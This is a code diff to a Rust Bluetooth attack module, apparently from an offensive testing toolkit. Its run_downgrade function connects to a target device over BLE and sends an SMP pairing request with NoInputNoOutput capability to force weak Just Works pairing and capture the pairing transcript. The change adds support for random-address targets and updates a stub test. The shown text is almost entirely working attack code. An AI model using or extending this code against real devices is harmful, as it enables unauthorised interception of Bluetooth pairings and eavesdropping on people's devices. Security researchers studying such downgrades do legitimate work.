@@ -25,9 +25,9 @@ const LE_CREATE_CONNECTION: u16 = 0x0D;
 ///   5. Send SMP Pairing Request with NoInputNoOutput IO capability
 ///   6. Receive SMP Pairing Response
 ///   7. Return transcript as BtCapture::PairingTranscript
-pub fn run_downgrade(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
+pub fn run_downgrade(hci: &HciSocket, target_addr: &str, addr_type: u8) -> BtAttackResult {
     let start = Instant::now();
-    log::info!("smp_downgrade: targeting {}", target_addr);
+    log::info!("smp_downgrade: targeting {} (addr_type={})", target_addr, addr_type);
 
     // Step 1: Send HCI_LE_Create_Connection (OGF 0x08, OCF 0x0D)
     let bdaddr = parse_bdaddr(target_addr);
@@ -37,11 +37,13 @@ pub fn run_downgrade(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
     //   peer_addr_type(1) + peer_addr(6) + own_addr_type(1) +
     //   conn_interval_min(2) + conn_interval_max(2) + conn_latency(2) +
     //   supervision_timeout(2) + min_ce_length(2) + max_ce_length(2)
+    // HCI peer_addr_type: 0x00 = public, 0x01 = random
+    let hci_addr_type = if addr_type == 2 { 0x01 } else { 0x00 };
     let mut params = Vec::with_capacity(25);
     params.extend_from_slice(&0x0060u16.to_le_bytes()); // scan_interval: 60ms
     params.extend_from_slice(&0x0030u16.to_le_bytes()); // scan_window: 30ms
     params.push(0x00); // filter_policy: no whitelist
-    params.push(0x00); // peer_addr_type: public
+    params.push(hci_addr_type); // peer_addr_type from discovery
     params.extend_from_slice(&bdaddr); // peer address
     params.push(0x00); // own_addr_type: public
     params.extend_from_slice(&0x0018u16.to_le_bytes()); // conn_interval_min: 30ms
@@ -99,7 +101,7 @@ pub fn run_downgrade(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
     log::info!("smp_downgrade: LE connection established");
 
     // Step 4: Open L2CAP SMP fixed channel (CID 0x0006, LE public, PSM 1)
-    let l2cap = match super::l2cap_socket::L2capSocket::connect(target_addr, 1, 0, 0x0006) {
+    let l2cap = match super::l2cap_socket::L2capSocket::connect(target_addr, addr_type, 0, 0x0006) {
         Ok(sock) => sock,
         Err(e) => {
             log::info!("smp_downgrade: L2CAP SMP connect failed: {}", e);
@@ -221,7 +223,7 @@ mod tests {
     #[cfg(not(target_os = "linux"))]
     fn test_run_downgrade_stub() {
         let hci = HciSocket::open(0).unwrap();
-        let result = run_downgrade(&hci, "AA:BB:CC:DD:EE:FF");
+        let result = run_downgrade(&hci, "AA:BB:CC:DD:EE:FF", 1);
         assert_eq!(result.attack_type, BtAttackType::SmpDowngrade);
         assert!(result.success);
         assert!(result.capture.is_some());
